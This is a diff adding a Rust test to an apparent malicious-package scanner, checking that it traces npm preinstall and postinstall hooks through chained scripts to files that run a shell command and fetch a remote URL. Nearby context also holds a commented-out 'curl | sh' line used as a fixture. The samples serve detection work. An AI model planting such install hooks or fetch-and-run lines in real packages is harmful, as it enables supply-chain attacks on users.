@@ -189,6 +189,42 @@ fn inline_node_eval_requires_join_the_install_surface() {
 }
 
 #[test]
+fn install_hooks_follow_named_scripts_and_bun_run() {
+    let pj = r#"{"name": "ind", "version": "1.0.0", "main": "lib/main.js",
+        "scripts": {"preinstall": "bun run index.js", "postinstall": "npm run setup",
+                    "setup": "yarn fetch", "fetch": "node tools/fetch.js", "test": "node t.js"}}"#;
+    let bytes = tar_gz_files(&[
+        ("package/package.json", pj),
+        (
+            "package/index.js",
+            "require('child_process').execSync('id');\n",
+        ),
+        (
+            "package/tools/fetch.js",
+            "require('https').get('https://x.example/p');\n",
+        ),
+        ("package/t.js", "require('child_process').execSync('id');\n"),
+        ("package/lib/main.js", "module.exports = 1;\n"),
+    ]);
+    let r = scan(&bytes, "ind-1.0.0.tgz");
+    assert_eq!(
+        r.install_surface,
+        vec![
+            "package.json:scripts.preinstall",
+            "index.js",
+            "package.json:scripts.postinstall",
+            "package.json:scripts.setup",
+            "package.json:scripts.fetch",
+            "tools/fetch.js",
+            "lib/main.js"
+        ]
+    );
+    assert_eq!(r.features["n_npm_install_scripts"], 2.0);
+    assert_eq!(r.features["inst_network"], 1.0);
+    assert!(r.features["inst_proc_exec"] >= 1.0);
+}
+
+#[test]
 fn comments_do_not_count_end_to_end() {
     let setup = "# import subprocess; subprocess.call('curl http://1.2.3.4 | sh')\n'''\nos.system is not called\n'''\nfrom setuptools import setup\nsetup(name='quiet')\n";
     let bytes = tar_gz_files(&[("quiet-1.0/setup.py", setup)]);
